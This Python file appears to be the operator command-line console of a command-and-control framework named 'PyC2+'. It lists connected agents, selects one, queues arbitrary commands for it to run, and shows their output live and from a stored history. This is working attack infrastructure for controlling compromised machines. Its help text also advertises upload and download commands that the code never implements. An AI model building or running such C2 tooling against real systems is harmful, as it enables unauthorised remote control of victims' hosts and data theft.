import time
import os
import json
import base64
import threading

from lib.config import agents, tasks, results, result_queues, AGENT_TIMEOUT

# Colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def start_cli():
    time.sleep(1)

    print(CYAN + BOLD + "\n" + "="*50)
    print("                 PyC2+ CLI")
    print("="*50 + RESET)
    print(YELLOW + "Type 'help' for commands or 'exit' to quit.\n" + RESET)

    selected = None
    stop_live = threading.Event()

    def live_thread():
        """Instant live-output with blocking queue get()."""
        while not stop_live.is_set():
            if not selected:
                time.sleep(0.2)
                continue
            q = result_queues.get(selected)
            if not q:
                time.sleep(0.2)
                continue

            try:
                entry = q.get(timeout=0.2)
            except:
                continue

            print(f"\n{YELLOW}[{entry['timestamp']}] {RESET}")
            print(CYAN + entry["result"] + RESET)

    threading.Thread(target=live_thread, daemon=True).start()

    def prompt():
        if selected:
            return f"\n{RED}[PyC2+ | {selected}]{RESET}> "
        return f"\n{RED}[PyC2+]{RESET}> "

    while True:
        try:
            cmd = input(prompt()).strip()
        except (KeyboardInterrupt, EOFError):
            print(f"\n{YELLOW}Exiting PyC2+ CLI...{RESET}")
            break

        if not cmd:
            continue

        if cmd == "help":
            print(CYAN + BOLD + "\nAvailable commands:" + RESET)
            print(f"{GREEN}  agents{RESET}        - list agents")
            print(f"{GREEN}  select <id>{RESET}   - select agent")
            print(f"{GREEN}  send <cmd>{RESET}    - send command")
            print(f"{GREEN}  put <l> <r>{RESET}   - upload file")
            print(f"{GREEN}  get <rpath>{RESET}   - download file")
            print(f"{GREEN}  history{RESET}       - show stored results")
            print(f"{GREEN}  exit{RESET}          - quit CLI\n")
            continue

        if cmd == "agents":
            live = [aid for aid, info in agents.items()
                    if time.time() - info["last_seen"] <= AGENT_TIMEOUT]
            if not live:
                print(RED + "[!] No agents connected." + RESET)
            else:
                print(CYAN + "\nConnected agents:" + RESET)
                for a in live:
                    print(f"{YELLOW}  → {a}{RESET}")
            continue

        if cmd.startswith("select "):
            aid = cmd.split()[1]
            if aid in agents and time.time() - agents[aid]["last_seen"] <= AGENT_TIMEOUT:
                selected = aid
                print(f"{GREEN}[+] Selected agent: {aid}{RESET}")

                # Clear old live queue data
                with result_queues[aid].mutex:
                    result_queues[aid].queue.clear()

            else:
                print(RED + "[!] Invalid or offline agent." + RESET)
            continue

        if cmd.startswith("send "):
            if not selected:
                print(RED + "[!] Select agent first." + RESET)
                continue
            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
                print(RED + "[!] Agent offline." + RESET)
                continue
            command = cmd[5:]
            tasks[selected].put(command)
            print(f"{GREEN}[+] Command queued for agent: {command}{RESET}")
            continue

        if cmd == "history":
            if not selected:
                print(RED + "[!] No agent selected." + RESET)
                continue
            for e in results[selected]:
                print(f"\n{YELLOW}[{e['timestamp']}] {RESET}")
                print(CYAN + e["result"] + RESET)
            continue

        if cmd == "exit":
            print(YELLOW + "Leaving CLI..." + RESET)
            stop_live.set()
            break

        print(RED + "[!] Unknown command." + RESET)
